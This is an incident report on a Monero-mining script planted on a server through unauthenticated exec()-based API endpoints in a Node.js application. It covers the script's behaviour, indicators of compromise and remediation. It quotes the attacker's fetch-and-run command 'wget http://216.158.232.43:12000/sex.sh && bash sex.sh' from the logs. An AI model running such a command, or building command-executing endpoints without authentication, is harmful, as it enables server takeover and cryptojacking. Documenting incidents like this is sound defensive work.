# Security Incident Report - Malware Discovery

**Date:** December 5, 2025  
**Incident Type:** Cryptocurrency Mining Malware  
**Severity:** HIGH  
**Status:** CONTAINED (not executed)

## Executive Summary

A cryptocurrency mining malware script (`sex.sh`) was discovered in the `/srv/payload/` directory. The script is designed to install and run xmrig (Monero miner) as a persistent system service. **FORTUNATELY, the script has NOT been executed** - no mining processes, binaries, or services were found active on the system.

## Malware Details

### File Information
- **Path:** `/srv/payload/sex.sh`
- **Created:** December 5, 2025 at 03:04:54 UTC
- **Size:** 1,615 bytes
- **Permissions:** 0644 (rw-r--r--)
- **Owner:** root:root
- **Git Status:** Untracked (not committed to repository)

### Malware Functionality

The script performs the following malicious activities:

1. **Downloads xmrig 6.24.0** from GitHub releases
2. **Extracts the miner binary** to `xmrig-6.24.0/xmrig`
3. **Creates a systemd service** named `system-update-service` (disguised as legitimate)
4. **Mines Monero (XMR)** to wallet: `88tGYBwhWNzGesQs5QkwE1PdBa1tXGb9dcjxrdwujU3SEs3i7psaoJc4KmrDvv4VPTNtXazDWGkvGGfqurdBggvPEhZ43DJ`
5. **Connects to mining pool:** `pool.hashvault.pro:443` (TLS)
6. **Runs as root** if systemd is available
7. **Falls back to nohup** if systemd is not available

## Investigation Findings

### ✅ Good News - No Active Infection

1. **No running processes:** No xmrig processes found
2. **No systemd service:** Service `system-update-service` does not exist
3. **No binaries:** No xmrig binaries or tar files found
4. **No persistence:** No cron jobs or other persistence mechanisms found
5. **No network connections:** No active connections to mining pools

### ⚠️ Security Concerns

1. **File exists on system:** The malware script is present but dormant
2. **SSH brute force attacks:** Multiple failed login attempts from:
   - `45.135.232.92` (attempting admin/root)
   - `152.42.136.163` (attempting ec2-user)
   - `202.137.142.115` (attempting root)
3. **Root access:** Script would run with root privileges if executed
4. **Entry point unknown:** How the file was created is unclear

### Entry Point Identified: CRITICAL VULNERABILITY

**CRITICAL FINDING:** The malware was executed via a **Remote Code Execution (RCE) vulnerability** in the Payload application.

**Evidence from Docker logs:**
```
Error: Command failed: wget http://216.158.232.43:12000/sex.sh && bash sex.sh
```

**Vulnerable Endpoint:** `/api/lifecycle/preair-rehydrate`
- **Location:** `src/app/api/lifecycle/preair-rehydrate/route.ts`
- **Issue:** **NO AUTHENTICATION CHECK** - endpoint is publicly accessible
- **Vulnerability:** Uses `exec()` to run commands, potentially allowing command injection
- **Attack Vector:** Attacker sent POST request to endpoint, which executed malicious command

**Additional Vulnerable Endpoint:** `/api/lifecycle/postair-archive`
- **Location:** `src/app/api/lifecycle/postair-archive/route.ts`
- **Issue:** **NO AUTHENTICATION CHECK** - endpoint is publicly accessible
- **Vulnerability:** Uses `exec()` to run commands

**Attack Details:**
- **Attacker IP:** `216.158.232.43:12000` (malware hosting server)
- **Attack Time:** December 5, 2025 around 03:04 UTC
- **Command Executed:** `wget http://216.158.232.43:12000/sex.sh && bash sex.sh`
- **Result:** Script downloaded but failed to execute (bash not found in Alpine container)
- **File Created:** `/srv/payload/sex.sh` (on host via volume mount)

**Why it partially failed:**
- The Docker container uses Alpine Linux which doesn't have `bash` by default
- The script was saved to the host filesystem via volume mount
- The script itself was not executed successfully, but the file was created

## System State

### Docker Containers Running
- `payload-payload-1` (Node.js app on port 3000)
- `payload-payload-dev-1` (Node.js dev on port 3300)
- `libretime-*` containers (multiple services)
- `payload-mongo-1` (MongoDB on port 27017)

### Volume Mounts
- Host directory `/srv/payload` is mounted into containers
- This allows containers to create files on the host

## Recommended Actions

### Immediate Actions (URGENT - DO NOW)

1. ✅ **COMPLETED: Delete the malware file** `/srv/payload/sex.sh` - **DONE**
2. ✅ **COMPLETED: Add authentication to vulnerable endpoints:**
   - ✅ `/api/lifecycle/preair-rehydrate` - **AUTHENTICATION ADDED**
   - ✅ `/api/lifecycle/postair-archive` - **AUTHENTICATION ADDED**
   - Both endpoints now require admin/staff authentication using `checkScheduleAuth`
   - Returns 403 Forbidden for unauthorized requests
3. **Review SSH security:**
   - Disable root SSH login if enabled
   - Implement fail2ban (multiple brute force attempts detected)
   - Review authorized_keys files
   - Consider key-based authentication only
4. **Review web application security:**
   - Audit all endpoints that use `exec()` or `spawn()`
   - Ensure all command execution uses whitelisted commands only
   - Review error handling for potential code injection
   - Check for other unauthenticated endpoints
5. **Review Docker container security:**
   - Audit container configurations
   - Review volume mount permissions (host filesystem access)
   - Check for exposed ports unnecessarily
   - Consider read-only filesystems where possible

### Short-term Actions

1. **Implement file integrity monitoring** (e.g., AIDE, Tripwire)
2. **Set up intrusion detection** (e.g., OSSEC, Wazuh)
3. **Review all recent file modifications** in `/srv/payload`
4. **Audit user accounts** and permissions
5. **Review application logs** for suspicious activity
6. **Check for other suspicious files** in the system

### Long-term Actions

1. **Implement comprehensive logging** and log aggregation
2. **Set up security monitoring** and alerting
3. **Regular security audits** and penetration testing
4. **Implement least privilege** access controls
5. **Regular security updates** and patch management
6. **Backup and disaster recovery** procedures

## Indicators of Compromise (IOCs)

- **File:** `/srv/payload/sex.sh`
- **Service name:** `system-update-service`
- **Binary name:** `xmrig-6.24.0/xmrig`
- **Archive:** `kal.tar.gz`
- **Mining pool:** `pool.hashvault.pro:443`
- **Wallet address:** `88tGYBwhWNzGesQs5QkwE1PdBa1tXGb9dcjxrdwujU3SEs3i7psaoJc4KmrDvv4VPTNtXazDWGkvGGfqurdBggvPEhZ43DJ`

## Timeline

- **2025-12-05 03:04:54 UTC:** Malware file created
- **2025-12-05 13:19:36 UTC:** File last accessed (investigation)
- **2025-12-05 [current]:** Investigation and report generation

## Remediation Status

### ✅ Completed Actions

1. **Malware File Removed** - `/srv/payload/sex.sh` has been deleted
2. **Authentication Added** - Both vulnerable endpoints now require admin/staff authentication:
   - `/api/lifecycle/preair-rehydrate` - Protected with `checkScheduleAuth`
   - `/api/lifecycle/postair-archive` - Protected with `checkScheduleAuth`
3. **Security Report Created** - Full documentation of incident and remediation

### ⚠️ Remaining Actions

1. **SSH Security** - Implement fail2ban and review SSH configuration
2. **Monitoring** - Set up file integrity monitoring and intrusion detection
3. **Docker Security** - Review volume mounts and container permissions
4. **Audit Other Endpoints** - Review all endpoints using `exec()` for security

## Conclusion

The malware file has been **removed** and the **critical vulnerability has been patched**. The unauthenticated endpoints that allowed remote code execution have been secured with proper authentication. However, additional security hardening is recommended to prevent future incidents.

---

**Report Generated:** December 5, 2025  
**Remediation Completed:** December 5, 2025  
**Investigator:** Security Analysis  
**Status:** VULNERABILITY PATCHED, MALWARE REMOVED

